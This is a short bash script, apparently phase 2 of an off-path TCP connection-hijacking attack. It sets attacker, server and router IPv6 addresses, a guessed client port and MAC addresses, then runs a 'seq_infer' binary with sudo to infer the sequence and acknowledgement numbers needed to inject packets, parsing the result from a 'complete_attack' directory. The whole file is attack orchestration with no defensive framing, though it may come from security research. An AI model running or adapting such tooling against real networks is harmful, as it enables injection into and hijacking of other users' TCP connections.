# !/bin/bash
ATTACKER_PRIVATE_IP=fd00:6868:6868:0:1cc6:1355:7eb1:7d79; 
GUESSED_CLIENT_PORT=32846;
REMOTE_SERVER_IP=2402:4e00:c000:2000:7a50:8bca:52f8:0; 
REMOTE_SERVER_PORT=1000; 
ROUTER_WAN_IP=2402:f000:4:1007:809:ffff:fff3:fe16; 
PACKET_IFACE="en0"; 
SELF_MAC_ADDRESS="fe:cd:52:e5:d9:84"
ROUTER_MAC_ADDRESS="d4:da:21:77:c6:87";

printf "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ PHASE 2 ~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
echo `date`
echo "beginning phase 2 to infer sequence and ack numbers needed to inject.."

sudo ./seq_infer ${ATTACKER_PRIVATE_IP} ${GUESSED_CLIENT_PORT} ${REMOTE_SERVER_IP} ${REMOTE_SERVER_PORT} ${ROUTER_WAN_IP} ${PACKET_IFACE} ${SELF_MAC_ADDRESS} ${ROUTER_MAC_ADDRESS}

SEQ_ACK_RESULT=$(cat ../complete_attack/SEQ_ACK_RESULT)
SEQ=$(echo "$SEQ_ACK_RESULT" |grep -o "seq: .*"| awk -F": " '{print $2}'|head -n 1)
# echo $SEQ
ACK=$(echo "$SEQ_ACK_RESULT" |grep -o "ack: .*"| awk -F": " '{print $2}'|head -n 1)
echo `date`
sleep 3s